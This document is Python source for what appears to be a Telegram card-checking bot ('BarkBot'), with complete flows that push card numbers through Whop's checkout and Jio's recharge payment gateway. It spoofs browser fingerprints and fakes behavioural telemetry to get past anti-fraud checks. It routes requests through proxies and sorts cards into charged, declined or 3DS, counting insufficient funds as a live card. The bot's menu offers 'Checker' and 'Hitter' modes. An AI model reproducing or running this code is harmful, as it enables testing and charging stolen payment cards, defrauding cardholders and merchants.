                "x-fern-runtime-version": self.cfg["user_agent"], "x-ssk": self.ssk, **self._sentry()}
    def _ch_ua_brands(self):
        brands = []
        for part in self._ch_ua.split(","):
            m = re.match(r'"([^"]+)";v="(\d+)"', part.strip())
            if m: brands.append({"brand": m.group(1), "version": m.group(2)})
        return brands or [{"brand": "Chromium", "version": "152"}]
    def _bt_di(self):
        d = {"uaBrands": self._ch_ua_brands(), "uaMobile": False, "uaPlatform": self._platform.strip('"'),
             "languages": ["en-US", "en"], "timeZone": self._tz, "cookiesEnabled": True,
             "localStorageEnabled": True, "sessionStorageEnabled": True, "platform": "Win32",
             "hardwareConcurrency": self._cores, "deviceMemoryGb": self._mem,
             "screenWidth": self._sw, "screenHeight": self._sh, "screenAvailWidth": self._saw,
             "screenAvailHeight": self._sah, "innerWidth": self._iw, "innerHeight": self._ih,
             "devicePixelRatio": self._dpr, "maxTouchPoints": 0, "network": {},
             "plugins": ["PDF Viewer", "Chrome PDF Viewer"], "mimeTypes": ["application/pdf"],
             "webdriver": False, "suspectedHeadless": False,
             "webglVendor": "Google Inc. (Microsoft)",
             "webglRenderer": "ANGLE (Microsoft, Microsoft Basic Render Driver Direct3D11)",
             "sardine": {"status": "loading", "session_key_present": True}}
        return base64.b64encode(json.dumps(d, separators=(",", ":")).encode()).decode()
    def _bth(self, key, ref_path, patch=False):
        return {"accept": "*/*", "accept-language": "en-US,en;q=0.9", "bt-api-key": key,
                "bt-device-info": self._bt_di(), "cache-control": "no-cache",
                "content-type": "application/merge-patch+json" if patch else "application/json",
                "origin": self.BT, "pragma": "no-cache", "priority": "u=1, i",
                "referer": f"{self.BT}/web-elements/2.12.2/hosted-elements/{ref_path}",
                "sec-ch-ua": self._ch_ua, "sec-ch-ua-mobile": self._mobile,
                "sec-ch-ua-platform": self._platform, "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "none", "sec-gpc": "1", "user-agent": self.cfg["user_agent"]}
    @staticmethod
    def _is_oauth(url): return bool(url and "/oauth/callback" in url and "code=" in url)
    @staticmethod
    def _get_error(data):
        for k in ("last_confirm_error", "blocking_error", "last_payment_error", "error"):
            e = data.get(k)
            if not e: continue
            if isinstance(e, dict): return e.get("message") or e.get("detail") or str(e)
            if isinstance(e, str): return e
        return "Payment failed"
    @staticmethod
    def _encode_proxy(proxy_url):
        try:
            p = urlparse(proxy_url)
            if p.username or p.password:
                user = quote(p.username or "", safe=""); pw = quote(p.password or "", safe="")
                hp = p.hostname
                if p.port: hp = f"{hp}:{p.port}"
                p = p._replace(netloc=f"{user}:{pw}@{hp}")
                return urlunparse(p)
        except: pass
        return proxy_url
    def _retry(self, fn, label, retries=2, delay=1.5):
        last = None
        for attempt in range(1, retries+2):
            try: return fn()
            except (requests.ConnectionError, requests.Timeout) as e:
                last = e
                if attempt <= retries: time.sleep(delay)
        raise Exception(f"{label} failed: {last}")
    def _now(self): return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]+"Z"
    def _fire_twhop(self, with_fp=False):
        try:
            ctx = {"user_agent": self.cfg["user_agent"], "screen_resolution": f"{self._sw}x{self._sh}",
                   "language": "en-US", "timezone": self._tz, "sc": self._fp[:8].upper()}
            if with_fp:
                ctx["fingerprint"] = self._fp
                ctx["fingerprint_confidence"] = 0.6
            self.sess.post(f"{self.TWHOP}/conversions",
                json={"event_name": "identify", "company_id": self.cfg.get("company_id", ""),
                      "event_time": self._now(), "url": self._ref,
                      "user": {"anonymous_id": self._wuid, "linked_anonymous_id": self._anon_id},
                      "context": ctx, "source": "link"},
                headers={"content-type": "application/json", "origin": self.WHOP, "referer": self.WHOP+"/",
                         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "sec-gpc": "1"}, timeout=8)
        except: pass
    def s1_page(self):
        ph = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "accept-language": "en-US,en;q=0.9", "cache-control": "no-cache", "pragma": "no-cache",
              "priority": "u=0, i", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
              "sec-fetch-site": "none", "sec-fetch-user": "?1", "sec-gpc": "1", "upgrade-insecure-requests": "1"}
        r = self.sess.get(self._ref_noslash, headers=ph, timeout=30, allow_redirects=True)
        if r.status_code == 403: self._blocked = True; return False
        if r.status_code != 200: return False
        pg = r.text
        _sr = re.search(r'sentry-release=([a-f0-9]{40})', pg)
        if _sr: self._sentry_release = _sr.group(1)
        _s = self.sess.cookies.get("_whop_ssk")
        if _s: self.ssk = _s
        def _find(prefix, text):
            for pat in [rf'"(?:companyId|id)"\s*:\s*"({re.escape(prefix)}[A-Za-z0-9]{{5,30}})"',
                        rf'["\'/]({re.escape(prefix)}[A-Za-z0-9]{{5,30}})["\'/\?]',
                        rf'({re.escape(prefix)}[A-Za-z0-9]{{5,30}})']:
                m = re.search(pat, text)
                if m: return m.group(1)
            return None
        if not self.cfg.get("access_pass_id"):
            v = _find("prod_", pg)
            if v: self.cfg["access_pass_id"] = v
        if not self.cfg.get("company_id"):
            prod_id = self.cfg.get("access_pass_id", "")
            m = re.search(rf'"id"\s*:\s*"{re.escape(prod_id)}"[^{{}}]{{0,150}}?"id"\s*:\s*"(biz_[A-Za-z0-9]{{5,30}})"', pg, re.DOTALL)
            if m: self.cfg["company_id"] = m.group(1)
            else:
                m = re.search(r'companyId\s*:\s*"(biz_[A-Za-z0-9]{5,30})"', pg)
                if m: self.cfg["company_id"] = m.group(1)
        if not self.cfg.get("plan_id"):
            v = _find("plan_", pg)
            if v: self.cfg["plan_id"] = v
        return bool(self.cfg.get("access_pass_id"))
    def s2_affiliate(self):
        try:
            r = self.sess.post(f"{self.WHOP}/api/affiliate/resolve-tracking/",
                json={"companyId": self.cfg.get("company_id", ""), "accessPassId": self.cfg.get("access_pass_id", "")},
                headers={"content-type": "application/json", "origin": self.WHOP, "referer": self._ref,
                         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
                         "sec-gpc": "1", **self._sentry()}, timeout=15)
            d = r.json() if r.text.strip() else {}
            self.tracking_id = d.get("trackingLinkId")
        except: pass
    def s5_gql_related(self):
        try:
            self.sess.post(f"{self.WHOP}/api/graphql/coreFetchRelatedAccessPasses",
                json={"query": self.GQL_RELATED, "variables": {"accessPassId": self.cfg["access_pass_id"]},
                      "operationName": "coreFetchRelatedAccessPasses"}, headers=self._gql_h(), timeout=12)
        except: pass
    def s6_gql_access(self):
        try:
            self.sess.post(f"{self.WHOP}/api/graphql/coreFetchProductAccessLevel",
                json={"query": self.GQL_ACCESS, "variables": {"companyRoute": self.cfg.get("company_route", ""),
                      "accessPassId": self.cfg.get("access_pass_id", "")}, "operationName": "coreFetchProductAccessLevel"},
                headers=self._gql_h(), timeout=12)
        except: pass
    def s7_plans(self):
        r = self.sess.post(f"{self.WHOP}/api/graphql/HubFetchVisiblePlans",
            json={"query": self.GQL_PLANS, "variables": {"productId": self.cfg["access_pass_id"], "first": 10, "after": "MA=="},
                  "operationName": "HubFetchVisiblePlans"}, headers=self._gql_h(), timeout=15)
        if r.status_code != 200: raise Exception(f"GraphQL {r.status_code}")
        data = r.json()
        nodes = ((data.get("data") or {}).get("publicProduct") or {}).get("visiblePlans", {}).get("nodes", [])
        if not nodes: raise Exception("No plans")
        if not self.cfg.get("plan_id"): self.cfg["plan_id"] = nodes[0]["id"]
    def s8_tracking_pixels(self):
        try:
            self.sess.get(self._v1(f"accounts/{self.cfg.get('company_id','')}/tracking_pixels"),
                headers={"accept": "application/json", "origin": self.WHOP, "referer": self._ref,
                         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "sec-gpc": "1"}, timeout=8)
        except: pass
    def s9_twhop(self, with_fp=False): self._fire_twhop(with_fp)
    def s10_checkout(self):
        aff = self.cfg.get("affiliate_tag", ""); route = self.cfg.get("company_route", "")
        payload = {"items": [{"plan": self.cfg["plan_id"], "quantity": 1}],
                   "affiliate_code": aff or None, "attribution": {"source": "product_page_direct"},
                   "tracking_link_ids_by_account": ({self.cfg["company_id"]: self.tracking_id} if self.tracking_id and self.cfg.get("company_id") else {}),
                   "affiliate_code_candidates": {"global": aff, "by_product": {route: aff} if aff and route else {}}}
        r = self.sess.post(self._v1("checkout_sessions"), json=payload, headers=self._wh(), timeout=20)
        if not r.text.strip(): raise Exception(f"Empty checkout_sessions ({r.status_code})")
        d = r.json()
        if r.status_code not in (200, 201): raise Exception(f"checkout_sessions {r.status_code}")
        self.checkout_id = d["id"]; self.client_secret = d["client_secret"]
        self.account_id = (d.get("seller") or {}).get("id") or self.cfg.get("company_id", "")
        for req in (d.get("requirements") or []):
            if req.get("type") == "terms": self._terms_required = True
            elif req.get("type") == "custom_fields": self._custom_fields = req.get("fields") or []
        return d
    def s13_breakdown(self):
        r = self.sess.post(self._v1(f"checkout_sessions/{self.checkout_id}/calculate_breakdown"),
            json={"client_secret": self.client_secret}, headers=self._wh(), timeout=15)
        return r.json() if r.text.strip() else {}
    def s14_bt_key(self):
        cache_key = f"{self.account_id}_{self.cfg['plan_id']}"
        if cache_key in self._bt_pub_key_cache:
            self.bt_pub_key = self._bt_pub_key_cache[cache_key]; return self.bt_pub_key
        r = self.sess.get(self._v1(f"payment_method_types?account_id={self.account_id}&surface=modal_checkout&plan_id={self.cfg['plan_id']}"),
            headers=self._wh(no_ct=True), timeout=15)
        if r.status_code != 200: raise Exception(f"payment_method_types {r.status_code}")
        d = r.json() if r.text.strip() else {}
        for item in d.get("data", []):
            if item.get("type") == "card":
                key = (item.get("card") or {}).get("public_key")
                if key:
                    self.bt_pub_key = key
                    self._bt_pub_key_cache[cache_key] = key
                    return key
        raise Exception("BT public_key not found")
    def s16_recognize(self):
        try:
            self.sess.post(self._v1("session_intents/recognize"), json={"email": self.cfg["email"]},
                headers=self._wh(), timeout=10)
        except: pass
    def s17_bt_session(self):
        bt = requests.Session()
        if self.sess.proxies: bt.proxies = self.sess.proxies
        eid = str(uuid.uuid4())
        r = bt.post(f"{self.BT}/api/sessions",
            json={"deviceInfo": json.loads(base64.b64decode(self._bt_di()).decode()),
                  "sardine": {"status": "loading", "session_key_present": True}},
            headers={"accept": "*/*", "bt-api-key": self.bt_pub_key, "content-type": "application/json",
                     "origin": self.BT, "referer": f"{self.BT}/web-elements/2.12.2/hosted-elements/data-element.html?element_id={eid}",
                     "sec-ch-ua": self._ch_ua, "sec-ch-ua-mobile": self._mobile,
                     "sec-ch-ua-platform": self._platform, "user-agent": self.cfg["user_agent"]}, timeout=20)
        if r.status_code != 201: raise Exception(f"BT session {r.status_code}")
        d = r.json()
        return d["session_key"], d["nonce"], bt
    def s18_card_session(self, nonce):
        r = self.sess.post(self._v1("payment_method_types/card/session"),
            json={"account_id": self.account_id, "nonce": nonce}, headers=self._wh(), timeout=15)
        if r.status_code not in (200, 201): raise Exception(f"card/session {r.status_code}")
        d = r.json() if r.text.strip() else {}
        c = (d.get("session") or {}).get("container", "")
        if not c: raise Exception("No container")
        return c
    def s19_bt_token(self, bt, container):
        eid = str(uuid.uuid4())
        exp = (datetime.now(timezone.utc)+timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        r = bt.post(f"{self.BT}/api/tokens",
            json={"type": "card", "containers": [container], "expires_at": exp, "data": {"number": self.cfg["card_number"]}},
            headers=self._bth(self.bt_pub_key, f"data-element.html?element_id={eid}"), timeout=20)
        if r.status_code != 201: raise Exception(f"BT token {r.status_code}")
        d = r.json(); card = d.get("card", {})
        self._card_info = {"brand": card.get("brand", "?"), "last4": card.get("last4", "????"),
                           "funding": card.get("funding", "?"), "issuer": (card.get("issuer") or {}).get("name", ""),
                           "country": (card.get("issuer_country") or {}).get("alpha2", "")}
        return d["id"]
    def s20_bt_patch(self, bt, token_id, sk):
        e1, e2 = str(uuid.uuid4()), str(uuid.uuid4())
        r1 = bt.patch(f"{self.BT}/api/tokens/{token_id}",
            json={"data": {"expiration_month": self.cfg["card_exp_month"], "expiration_year": self.cfg["card_exp_year"]}},
            headers=self._bth(sk, f"card-expiration-date-element.html?element_id={e1}", patch=True), timeout=15)
        if r1.status_code != 200: raise Exception(f"BT expiry {r1.status_code}")
        r2 = bt.patch(f"{self.BT}/api/tokens/{token_id}",
            json={"data": {"cvc": self.cfg["card_cvc"]}},
            headers=self._bth(sk, f"card-verification-code-element.html?element_id={e2}", patch=True), timeout=15)
        if r2.status_code != 200: raise Exception(f"BT CVC {r2.status_code}")
    def s22_ctok(self, bt_token_id):
        r = self.sess.post(self._v1("confirmation_tokens"),
            json={"account_id": self.account_id,
                  "payment_method": {"type": "card", "category": "card", "card": {"token": bt_token_id}},
                  "billing_details": {"email": self.cfg["email"], "name": self.cfg["billing_name"],
                      "address": {"country": self.cfg["billing_country"], "line1": self.cfg["billing_line1"],
                                 "line2": self.cfg.get("billing_line2", ""), "city": self.cfg["billing_city"],
                                 "state": self.cfg["billing_state"], "postal_code": self.cfg["billing_postal_code"]}},
                  "return_url": self._ref, "setup_future_usage": "off_session",
                  "browser_info": {"platform": "Win32", "color_depth": 24, "screen_height": self._sh,
                                  "screen_width": self._sw, "javascript_enabled": True, "language": "en-US",
                                  "java_enabled": False, "browser_time_difference": random.choice([300, 360, 420, 480])}},
            headers=self._wh(), timeout=20)
        if r.status_code not in (200, 201): raise Exception(f"confirmation_tokens {r.status_code}")
        d = r.json()
        return d.get("id")
    def s23_confirm(self, ctok):
        attest = {"tos_accepted": True}
        if self._terms_required: attest["terms_accepted"] = True
        body = {"client_secret": self.client_secret,
                "browser_behavior_v1": {"elapsed_ms": random.randint(60000, 90000), "visible_ms": random.randint(60000, 90000),
                    "hidden_ms": 0, "submit_count": 1, "version": 1, "source": "elements_checkout",
                    "collector": {"revision": 1, "attached": True, "attach_count": 1, "runtime": "direct",
                                  "build": "a5293d512eb816c0c9c326631ec2a3fe6eb29441"},
                    "sardine": {"status": "loading", "load_ms": random.randint(3000, 6000), "session_key_present": True}},
                "confirmation_token": ctok, "attestations": attest}
        r = self.sess.post(self._v1(f"checkout_sessions/{self.checkout_id}/confirm"),
            json=body, headers=self._wh(), timeout=60)
        d = r.json() if r.text.strip() else {}
        pay = d.get("payment") or {}
        self._last_pay_id = pay.get("id", ""); self._last_entry = d.get("entry")
        return d
    def s24_poll(self, max_polls=20, base_iv=3):
        url = self._v1(f"checkout_sessions/{self.checkout_id}?client_secret={self.client_secret}")
        last = {}; etag = ""
        APPROVED = {"insufficient_funds", "bank_insufficient_funds"}
        THREE_DS = {"authentication_required", "three_d_secure_success", "three_d_secure_canceled",
                    "three_d_secure_failed", "three_d_secure_timeout", "three_d_secure_rejected_by_bank"}
        for i in range(1, max_polls+1):
            try:
                ph = self._wh(no_ct=True)
                if etag: ph["if-none-match"] = etag
                r = self.sess.get(url, headers=ph, timeout=15)
                if r.headers.get("etag"): etag = r.headers["etag"]
                d = r.json() if r.text.strip() and r.status_code != 304 else {}
            except: time.sleep(base_iv); continue
            last = d
            pay = d.get("payment") or {}
            err = d.get("last_confirm_error")
            err_code = (err or {}).get("code", "") if isinstance(err, dict) else ""
            err_msg = (err or {}).get("message", "") if isinstance(err, dict) else str(err or "")
            ps = pay.get("status", ""); pa = pay.get("paid_at"); pid = pay.get("id", "")
            if pay.get("id"): self._last_pay_id = pay["id"]
            if d.get("entry"): self._last_entry = d["entry"]
            if ps == "succeeded" or pa or d.get("entry"):
                return {"result": "charged", "payment_id": pid, "entry": d.get("entry"), "card": self._card_info, "data": d}
            if d.get("status") == "completed" and not (d.get("next_action") or {}).get("type"):
                return {"result": "charged", "payment_id": pid, "entry": d.get("entry"), "card": self._card_info, "data": d}
            if err_code:
                if err_code in APPROVED:
                    return {"result": "charged", "payment_id": pid, "entry": d.get("entry"), "card": self._card_info, "note": err_code, "data": d}
                if err_code in THREE_DS:
                    return {"result": "3ds", "url": "", "code": err_code, "data": d}
                return {"result": "declined", "message": err_msg or "Payment failed", "code": err_code, "data": d}
            if d.get("status") in ("failed", "canceled", "cancelled"):
                return {"result": "declined", "message": self._get_error(d), "code": d.get("status"), "data": d}
            na = d.get("next_action") or {}
            if na.get("type") == "redirect_to_url":
                url3 = (na.get("redirect_to_url") or {}).get("url", "")
                if self._is_oauth(url3):
                    return {"result": "charged", "payment_id": pid, "entry": d.get("entry"), "card": self._card_info, "note": "oauth", "data": d}
                return {"result": "3ds", "url": url3, "data": d}
            time.sleep(max(1, int(na.get("poll_after_seconds", base_iv))))
        return {"result": "3ds", "url": "", "code": "poll_timeout", "data": last}
    def _flow(self):
        if not self._retry(self.s1_page, "page_load"): raise Exception("Page load failed")
        self.s2_affiliate(); self.s5_gql_related(); self.s6_gql_access(); self.s7_plans()
        self.s9_twhop(); self.s8_tracking_pixels(); self.s10_checkout()
        self.s9_twhop(with_fp=True); self.s13_breakdown()
        self.s14_bt_key(); self.s16_recognize()
        sk, nonce, bt = self._retry(self.s17_bt_session, "bt_session")
        container = self.s18_card_session(nonce)
        bt_tok = self.s19_bt_token(bt, container)
        self.s20_bt_patch(bt, bt_tok, sk)
        ctok = self.s22_ctok(bt_tok)
        try: result = self.s23_confirm(ctok)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            result = {"status": "confirm_timeout", "payment": {}, "next_action": None, "last_confirm_error": None, "entry": None}
        return result
    def _interpret(self, result):
        APPROVED = {"insufficient_funds", "bank_insufficient_funds"}
        THREE_DS = {"authentication_required", "three_d_secure_success", "three_d_secure_canceled",
                    "three_d_secure_failed", "three_d_secure_timeout", "three_d_secure_rejected_by_bank"}
        st = result.get("status"); na = result.get("next_action") or {}; pay = result.get("payment") or {}
        err = result.get("last_confirm_error")
        err_code = (err or {}).get("code", "") if isinstance(err, dict) else ""
        err_msg = (err or {}).get("message", "") if isinstance(err, dict) else str(err or "")
        if st == "completed" and pay.get("status") == "succeeded":
            return {"status": "charged", "payment_id": self._last_pay_id, "entry": self._last_entry, "card": self._card_info}
        if st == "completed" and not na.get("type"):
            return {"status": "charged", "payment_id": self._last_pay_id, "entry": self._last_entry, "card": self._card_info}
        if err_code:
            if err_code in APPROVED: return {"status": "charged", "payment_id": self._last_pay_id, "entry": self._last_entry, "card": self._card_info, "note": err_code}
            if err_code in THREE_DS: return {"status": "3ds", "url": "", "code": err_code, "card": self._card_info}
            return {"status": "declined", "message": err_msg or "Payment failed", "code": err_code, "card": self._card_info}
        if st in ("failed", "canceled", "cancelled"):
            return {"status": "declined", "message": self._get_error(result), "code": st, "card": self._card_info}
        if na.get("type") == "redirect_to_url":
            url3 = (na.get("redirect_to_url") or {}).get("url", "")
            if self._is_oauth(url3): return {"status": "charged", "payment_id": self._last_pay_id, "entry": self._last_entry, "card": self._card_info, "note": "oauth"}
            return {"status": "3ds", "url": url3, "card": self._card_info}
        poll = self.s24_poll()
        r = poll.get("result", "unknown")
        if r == "charged": return {"status": "charged", "payment_id": poll.get("payment_id", ""), "entry": poll.get("entry"), "card": self._card_info, "note": poll.get("note", "")}
        if r == "declined": return {"status": "declined", "message": poll.get("message", "Payment failed"), "code": poll.get("code", ""), "card": self._card_info}
        if r == "3ds": return {"status": "3ds", "url": poll.get("url", ""), "code": poll.get("code", ""), "card": self._card_info}
        return {"status": r or st or "unknown", "card": self._card_info}
    def run_api(self):
        t0 = time.time()
        try:
            result = self._flow()
            out = self._interpret(result)
        except Exception as e:
            out = ({"status": "error", "message": "ProxyError: blocked (403)"} if self._blocked else {"status": "error", "message": str(e)})
        out["elapsed_ms"] = round((time.time()-t0)*1000)
        return out

WHOP_CONFIG = {"product_url": "", "company_route": "", "access_pass_route": "", "affiliate_tag": "", "plan_id": "",
    "access_pass_id": "", "company_id": "", "email": "", "billing_name": "", "billing_city": "", "billing_country": "US",
    "billing_line1": "", "billing_line2": "", "billing_postal_code": "", "billing_state": "",
    "card_number": "", "card_exp_month": 0, "card_exp_year": 0, "card_cvc": "", "proxy": "", "user_agent": ""}

def parse_whop_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4: return None, "cc must be NUMBER|MM|YY|CVC"
    num = parts[0].replace(" ", "").replace("-", "")
    if not num.isdigit() or len(num) < 13: return None, "Invalid card number"
    mon = int(parts[1])
    if not (1 <= mon <= 12): return None, "Invalid month"
    yr = int(parts[2]); yr = yr + 2000 if yr < 100 else yr
    if yr < 2024: return None, "Card expired"
    return {"num": num, "mon": mon, "yr": yr, "cvc": parts[3]}, None

def run_whop_check(url, cc_str, email="", proxy=""):
    parsed, err = parse_whop_cc(cc_str)
    if err: return {"status": "error", "message": err}
    cfg = {**WHOP_CONFIG, "product_url": url, "email": email, "card_number": parsed["num"],
           "card_exp_month": parsed["mon"], "card_exp_year": parsed["yr"], "card_cvc": parsed["cvc"], "proxy": proxy}
    return WhopCheckout(cfg).run_api()

# ============================================================
#  JIO RECHARGE (Proxy + Timeout 45 + Retry)
# ============================================================
def _jio_run_single(number, amount, cc, proxy=None):
    try:
        from curl_cffi import requests as c_requests
    except ImportError:
        return {"status": "error", "message": "curl_cffi not installed. Run: pip install curl_cffi"}
    try:
        parts = cc.split("|")
        if len(parts) != 4: return {"status": "error", "message": "Invalid CC"}
        CARD_NUM, CARD_MM, CARD_YY, CARD_CVV = parts
        if len(CARD_YY) == 2: CARD_YY = "20" + CARD_YY
        CARD_NAME = "matt henry"; CARD_PREFIX = CARD_NUM[:6]
        PROFILES = [
            {"imp": "chrome131", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
            {"imp": "chrome124", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
        ]
        pf = random.choice(PROFILES); UA = pf["ua"]; IMP = pf["imp"]
        session = c_requests.Session(impersonate=IMP)
        if proxy:
            proxy_url = proxy if "://" in proxy else f"http://{proxy}"
            session.proxies = {"http": proxy_url, "https": proxy_url}
        session.get("https://www.jio.com/", headers={"User-Agent": UA}, verify=False, timeout=45)
        r = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}",
            headers={"User-Agent": UA, "Accept": "application/json"}, timeout=45)
        d = r.json()
        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return {"status": "error", "message": "Not a Jio number"}
        primary = d.get("primaryService") or {}
        billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
        next_value = d.get("nextPage") or billing_type
        plans_ref = f"https://www.jio.com/selfcare/recharge/mobility/plans/?serviceType=mobility&serviceId={number}&next={next_value}&billingType={billing_type}&entrysource=Widget"
        r4 = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{number}",
            headers={"User-Agent": UA, "Referer": plans_ref, "Accept": "*/*"}, timeout=45)
        plans_json = r4.json()
        target_plan = None
        for cat in plans_json.get("planCategories") or []:
            for sub in cat.get("subCategories") or []:
                for plan in sub.get("plans") or []:
                    if plan.get("key") and float(plan.get("amount") or 0) == float(amount):
                        target_plan = plan; break
                if target_plan: break
            if target_plan: break
        if not target_plan: return {"status": "error", "message": f"No plan for Rs {amount}"}
        plan_key = target_plan["key"]
        session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
            headers={"User-Agent": UA, "Content-Type": "application/json", "Referer": plans_ref},
            json={"planKey": plan_key, "selectedService": number}, timeout=45)
        r6 = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
            headers={"User-Agent": UA, "Content-Type": "application/json", "Referer": plans_ref},
            json={"addonPlanKeys": [], "flexiTopupFlow": False, "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": number}]}, timeout=45)
        payment_url = r6.json().get("paymentURL", "")
        r7 = session.get(payment_url, headers={"User-Agent": UA}, allow_redirects=True, timeout=45)
        fa = re.search(r"action='([^']+)'", r7.text); fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r7.text)
        pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k: v for k, v in fi}
        r8 = session.post(pay_form_url, headers={"User-Agent": UA}, data=pay_form_data, allow_redirects=True, timeout=45)
        pay_jio_ref = r8.url
        r9 = session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
            headers={"User-Agent": UA, "Content-Type": "application/json", "Origin": "https://pay.jio.com", "Referer": pay_jio_ref},
            json={"paymentMode": "CCDC", "cardPrefix": CARD_PREFIX, "isEMISelected": False, "viewOffer": False,
                  "skuCode": None, "copco": None, "isStoreCreditSelected": None}, timeout=45)
        x_token = r9.json().get("token", "")
        if not x_token: return {"status": "error", "message": "No x-token"}
        r10 = session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
            headers={"User-Agent": UA, "Content-Type": "application/json", "Origin": "https://pay.jio.com",
                     "Referer": pay_jio_ref, "x-token": x_token},
            json={"cvvNumber": CARD_CVV, "cashBackApplied": "N", "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                  "customerCardTypeValue": "mastercard", "paymentMode": "CCDC", "offerAppliedByCust": False, "viewOffer": False,
                  "cardType": "ic_mastercard", "cardNumber": CARD_NUM, "cardTypeText": "MASTERCARD_CARD",
                  "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cardHolderName": CARD_NAME, "userCardSaveConsent": False,
                  "browserDetails": {"browserHeader": "application/json", "browserJavaEnabled": False,
                      "browserJavascriptEnabled": True, "browserLanguage": "en-US",
                      "browserColorDepth": 24, "browserScreenHeight": 1080, "browserScreenWidth": 1920,
                      "browserTz": -330, "browserUserAgent": UA}}, timeout=60)
        d10 = r10.json()
        if not d10.get("status"): return {"status": "declined", "message": d10.get("message", "Card confirmation failed")}
        html_form = d10.get("htmlForm", "")
        ea = re.search(r"action='([^']+)'", html_form); ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        eu = ea.group(1) if ea else ""; ed = {k: v for k, v in ei}
        r11 = session.post(eu, headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}, data=ed, allow_redirects=True, timeout=45)
        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r11.url + r11.text)
        if not m: return {"status": "declined", "message": "Bank connect failed"}
        gl_token = m.group(1)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
        session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc", params={"x-gl-token": gl_token},
            headers={"User-Agent": UA, "Referer": gl_ref}, timeout=45)
        session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow", params={"x-gl-token": gl_token},
            headers={"User-Agent": UA, "Content-Type": "application/json", "Origin": "https://api.payglocal.com", "Referer": gl_ref},
            json={"isEnc": "false", "payload": {"customerCurrency": "INR", "saveCurrencyPreference": False,
                  "browserDetails": {"colorDepth": 24, "javaEnabled": False, "javaScripEnabled": True, "language": "en-US",
                                     "screenHeight": 1080, "screenWidth": 1920, "timeZone": -330},
                  "billingData": {"addressCountry": "FR"}, "shippingData": {}, "agreedOnTnCs": True}}, timeout=45)
        r14 = session.post("https://api.payglocal.com/gl/v1/payments/risk/fp", params={"x-gl-token": gl_token},
            headers={"User-Agent": UA, "Content-Type": "application/json", "Origin": "https://api.payglocal.com", "Referer": gl_ref},
            json={"requestId": f"{int(time.time()*1000)}.{random.randint(100000,999999)}", "visitorId": "Y8c4sEunqz0opl0b6YAd",
                  "visitorFound": True, "confidenceScore": 1}, timeout=45)
        kid = r14.json().get("data", {}).get("kid", "")
        if not kid: return {"status": "declined", "message": "Risk check failed"}
        time.sleep(random.uniform(0.5, 1.2))
        r15 = session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay", params={"x-gl-token": gl_token},
            headers={"User-Agent": UA, "Content-Type": "application/json", "Origin": "https://api.payglocal.com", "Referer": gl_ref},
            json={"isEnc": "false", "kid": kid, "payload": {
                "cardNumber": CARD_NUM, "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cvv": CARD_CVV,
                "cardHolderName": CARD_NAME, "saveCard": False,
                "browserDetails": {"colorDepth": 24, "javaEnabled": False, "javaScriptEnabled": True,
                    "language": "en-US", "screenHeight": 1080, "screenWidth": 1920, "timeZone": -330, "userAgent": UA}}}, timeout=60)
        result = r15.json()
        status = result.get("status", ""); message = result.get("message", "")
        if status in ("SUCCESS", "APPROVED"):
            return {"status": "charged", "message": "Recharge Successful", "plan": amount, "number": number}
        return {"status": "declined", "message": message or status or "Failed", "plan": amount, "number": number}
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}


def _jio_run_with_retry(number, amount, cc, proxy=None, max_retries=2):
    last = None
    for attempt in range(max_retries + 1):
        try:
            result = _jio_run_single(number, amount, cc, proxy)
            if result.get('status') != 'error':
                return result
            last = result
        except Exception as e:
            last = {"status": "error", "message": str(e)[:80]}
        if attempt < max_retries:
            time.sleep(2)
    return last or {"status": "error", "message": "All retries failed"}
# ============================================================
#  BarkBot — FINAL v8.0 (Part 2/2)
#  Bot Handlers, Commands, Site, Proxy, Admin, Startup
# ============================================================

# ============================================================
#  BOT INIT
# ============================================================
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def check_bot_status(event): return get_bot_status()=='off' and not is_admin(event.sender_id)
async def check_banned(event): return is_banned(event.sender_id) and not is_admin(event.sender_id)

# ============================================================
#  KEYBOARDS
# ============================================================
def get_main_keyboard():
    return [
        [Button.inline("Checker", b"menu_checker", style="primary"),
         Button.inline("Hitter", b"menu_hitter", style="danger")],
        [Button.inline("Plans", b"menu_plans", style="success"),
